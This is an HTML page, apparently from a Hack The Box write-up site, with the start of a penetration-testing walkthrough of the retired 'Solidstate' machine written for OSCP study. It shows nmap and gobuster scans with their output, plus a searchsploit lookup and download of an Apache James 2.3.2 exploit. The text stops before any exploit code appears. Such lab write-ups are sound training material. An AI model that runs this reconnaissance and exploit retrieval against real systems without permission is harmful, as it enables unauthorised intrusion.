@@ -1,0 +1,1429 @@
+<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+	
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
+      
+      
+        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Solidstate Writeup wo Metasploit/">
+      
+      
+        <meta name="author" content="Rushi Chaudhari">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+	<meta name="format-detection" content="telephone=no">
+
+    
+      
+        <title>28. Solidstate Writeup w/o Metasploit.md - Hackthebox Solutions</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#009688">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../css/katex.css">
+    
+      <link rel="stylesheet" href="../../css/custom.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#reconnaissance" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Hackthebox Solutions
+            </span>
+            <span class="md-header-nav__topic">
+              
+                28. Solidstate Writeup w/o Metasploit.md
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Hackthebox Solutions
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Preface" class="md-nav__link">
+      Preface
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      I Retired
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        I Retired
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
+      1. Access Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
+      2. Jerry Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
+      3. Blue Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
+      4. Blocky Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
+      5. Calamity Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
+      6. Devoops Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
+      7. Apocalyst Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
+      8. Poison Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
+      9. Postman Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
+      10. Beep Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
+      11. Help Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
+      12. Mirai Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
+      13. Curling Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
+      14. Nibbles Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
+      15. Valentine Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
+      16. Popcorn Writeups.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
+      17. Cronos Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
+      18. Legacy Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
+      19. Openadmin Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
+      20. Bank Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
+      21. Shocker Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
+      22. Luke Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
+      23. Arctic Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
+      24. Granny Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
+      25. Netmon Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
+      26. Sense Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
+      27. Sunday Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+    <a href="./" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
+      28. Solidstate Writeup w/o Metasploit.md
+    </a>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
+      29. Celestial Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
+      30. Tenten Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
+      31. Optimum Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
+      32. Haircut Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
+      33. Irked Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
+      34. Chatterbox Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
+      35. Bashed Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
+      36. Lame Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
+      37. Grandpa Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
+      38. Swagshop Writeup.md
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Solidstate Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_MeYitTUrBqsreYhVAiEXJw.png" /></p>
+<p>This is the 19th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
+<p>Let’s get started!</p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA initial 10.10.10.51
+</pre></div>
+
+<ul>
+<li>
+<p><strong>-sC</strong>: run default nmap scripts</p>
+</li>
+<li>
+<p><strong>-sV</strong>: detect service version</p>
+</li>
+<li>
+<p><strong>-O</strong>: detect OS</p>
+</li>
+<li>
+<p><strong>-oA</strong>: output all formats and store in file <em>initial</em></p>
+</li>
+</ul>
+<p>We get back the following result showing that 5 ports are open:</p>
+<ul>
+<li>
+<p><strong>Port 22: </strong>running OpenSSH 7.4p1</p>
+</li>
+<li>
+<p><strong>Port 25: </strong>running JAMES smtpd 2.3.2</p>
+</li>
+<li>
+<p><strong>Port 80:</strong> running httpd 2.4.25</p>
+</li>
+<li>
+<p><strong>Port 110: </strong>running JAMES pop3d 2.3.2</p>
+</li>
+<li>
+<p><strong>Port 119: </strong>running JAMES nntpd</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:22 EST
+<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.51
+<span class="lineno" data-linenos=" 3 "></span>Host is up (0.039s latency).
+<span class="lineno" data-linenos=" 4 "></span>Not shown: 995 closed ports
+<span class="lineno" data-linenos=" 5 "></span>PORT    STATE SERVICE VERSION
+<span class="lineno" data-linenos=" 6 "></span>22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+<span class="lineno" data-linenos=" 7 "></span>| ssh-hostkey:
+<span class="lineno" data-linenos=" 8 "></span>|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+<span class="lineno" data-linenos=" 9 "></span>|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+<span class="lineno" data-linenos="10 "></span>|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+<span class="lineno" data-linenos="11 "></span>25/tcp  open  smtp    JAMES smtpd 2.3.2
+<span class="lineno" data-linenos="12 "></span>|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]),
+<span class="lineno" data-linenos="13 "></span>80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
+<span class="lineno" data-linenos="14 "></span>|_http-server-header: Apache/2.4.25 (Debian)
+<span class="lineno" data-linenos="15 "></span>|_http-title: Home - Solid State Security
+<span class="lineno" data-linenos="16 "></span>110/tcp open  pop3    JAMES pop3d 2.3.2
+<span class="lineno" data-linenos="17 "></span>119/tcp open  nntp    JAMES nntpd (posting ok)
+<span class="lineno" data-linenos="18 "></span>No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ).
+<span class="lineno" data-linenos="19 "></span>TCP/IP fingerprint:
+<span class="lineno" data-linenos="20 "></span>OS:SCAN(V=7.80%E=4%D=12/29%OT=22%CT=1%CU=39873%PV=Y%DS=2%DC=I%G=Y%TM=5E0927
+<span class="lineno" data-linenos="21 "></span>OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
+<span class="lineno" data-linenos="22 "></span>OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST
+<span class="lineno" data-linenos="23 "></span>OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+<span class="lineno" data-linenos="24 "></span>OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+<span class="lineno" data-linenos="25 "></span>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+<span class="lineno" data-linenos="26 "></span>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+<span class="lineno" data-linenos="27 "></span>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+<span class="lineno" data-linenos="28 "></span>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+<span class="lineno" data-linenos="29 "></span>OS:D=S)
+<span class="lineno" data-linenos="30 "></span>
+<span class="lineno" data-linenos="31 "></span>Network Distance: 2 hops
+<span class="lineno" data-linenos="32 "></span>Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<span class="lineno" data-linenos="33 "></span>
+<span class="lineno" data-linenos="34 "></span>OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
+<span class="lineno" data-linenos="35 "></span>Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
+</pre></div>
+
+<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
+<p>Let’s run an nmap scan that covers all ports.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -p- -oA full 10.10.10.51
+</pre></div>
+
+<p>We get back the following result showing that one other port is open.</p>
+<ul>
+<li><strong>Port 4555:</strong> running JAMES Remote Admin 2.3.2</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:26 EST
+<span class="lineno" data-linenos=" 2 "></span>Nmap scan report for 10.10.10.51
+<span class="lineno" data-linenos=" 3 "></span>Host is up (0.052s latency).
+<span class="lineno" data-linenos=" 4 "></span>Not shown: 65529 closed ports
+<span class="lineno" data-linenos=" 5 "></span>PORT     STATE SERVICE     VERSION
+<span class="lineno" data-linenos=" 6 "></span>22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+<span class="lineno" data-linenos=" 7 "></span>| ssh-hostkey:
+<span class="lineno" data-linenos=" 8 "></span>|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+<span class="lineno" data-linenos=" 9 "></span>|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+<span class="lineno" data-linenos="10 "></span>|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+<span class="lineno" data-linenos="11 "></span>25/tcp   open  smtp        JAMES smtpd 2.3.2
+<span class="lineno" data-linenos="12 "></span>|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]),
+<span class="lineno" data-linenos="13 "></span>80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
+<span class="lineno" data-linenos="14 "></span>|_http-server-header: Apache/2.4.25 (Debian)
+<span class="lineno" data-linenos="15 "></span>|_http-title: Home - Solid State Security
+<span class="lineno" data-linenos="16 "></span>110/tcp  open  pop3        JAMES pop3d 2.3.2
+<span class="lineno" data-linenos="17 "></span>119/tcp  open  nntp        JAMES nntpd (posting ok)
+<span class="lineno" data-linenos="18 "></span>4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+<span class="lineno" data-linenos="19 "></span>Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<span class="lineno" data-linenos="20 "></span>
+<span class="lineno" data-linenos="21 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
+<span class="lineno" data-linenos="22 "></span>Nmap done: 1 IP address (1 host up) scanned in 75.55 seconds
+</pre></div>
+
+<p>Similarly, we run an nmap scan with the <strong>-sU </strong>flag enabled to run a UDP scan.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sU -p- -oA udp 10.10.10.51
+</pre></div>
+
+<p>I managed to root the box and write this blog while the UDP scan did not terminate. So I don’t have UDP nmap scan results for this box.</p>
+<p>Before we move on to enumeration, let’s make some mental notes about the nmap scan results.</p>
+<ul>
+<li>
+<p>The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.</p>
+</li>
+<li>
+<p>Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.</p>
+</li>
+<li>
+<p>Ports 25, 110, 119 and 4555 are running Apache James. Apache James is an open source SMTP and POP3 mail transfer agent and NNTP news server. Port 4555 immediately catches my eye since it’s a remote administration tool. We’ll need to run searchsploit on it to check if it is associated with any critical vulnerabilities.</p>
+</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<p>I always start off with enumerating HTTP first.</p>
+<p><strong>Port 80</strong></p>
+<p>Visit the application in the browser.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_ffkgnmV24ovMSS_Meno7uQ.png" /></p>
+<p>I visited all the pages in the application and didn’t find anything useful. Next, let’s run gobuster.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51
+</pre></div>
+
+<ul>
+<li>
+<p><strong>dir:</strong> uses directory/file brute forcing mode</p>
+</li>
+<li>
+<p><strong>-w: </strong>path to the wordlist</p>
+</li>
+<li>
+<p><strong>-u: </strong>target URL or domain</p>
+</li>
+</ul>
+<p>We get back the following result.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>===============================================================
+<span class="lineno" data-linenos=" 2 "></span>Gobuster v3.0.1
+<span class="lineno" data-linenos=" 3 "></span>by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) &amp; Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_))
+<span class="lineno" data-linenos=" 4 "></span>===============================================================
+<span class="lineno" data-linenos=" 5 "></span>[+] Url:            [http://10.10.10.51](http://10.10.10.51)
+<span class="lineno" data-linenos=" 6 "></span>[+] Threads:        10
+<span class="lineno" data-linenos=" 7 "></span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+<span class="lineno" data-linenos=" 8 "></span>[+] Status codes:   200,204,301,302,307,401,403
+<span class="lineno" data-linenos=" 9 "></span>[+] User Agent:     gobuster/3.0.1
+<span class="lineno" data-linenos="10 "></span>[+] Timeout:        10s
+<span class="lineno" data-linenos="11 "></span>===============================================================
+<span class="lineno" data-linenos="12 "></span>2019/12/29 17:31:19 Starting gobuster
+<span class="lineno" data-linenos="13 "></span>===============================================================
+<span class="lineno" data-linenos="14 "></span>/images (Status: 301)
+<span class="lineno" data-linenos="15 "></span>/assets (Status: 301)
+<span class="lineno" data-linenos="16 "></span>/server-status (Status: 403)
+<span class="lineno" data-linenos="17 "></span>===============================================================
+<span class="lineno" data-linenos="18 "></span>2019/12/29 17:56:46 Finished
+<span class="lineno" data-linenos="19 "></span>===============================================================
+</pre></div>
+
+<p>Nothing useful, so let’s move on to enumerating port 4555.</p>
+<p><strong>Port 4555</strong></p>
+<p>Run searchsploit on the software name and version.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>searchsploit Apache James Server 2.3.2
+</pre></div>
+
+<p>We get back the following result.</p>
+<p><img alt="" src="../../img/Solidstate Writeup wo Metasploit/1_x4f2NY7NAqbl--nPVfjvcA.png" /></p>
+<p>Jackpot! Transfer the exploit to our current directory.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>searchsploit -m 35513
+</pre></div>
+
+<p>You should never run scripts that you haven’t reviewed first, so let’s view the content of this exploit.</p>
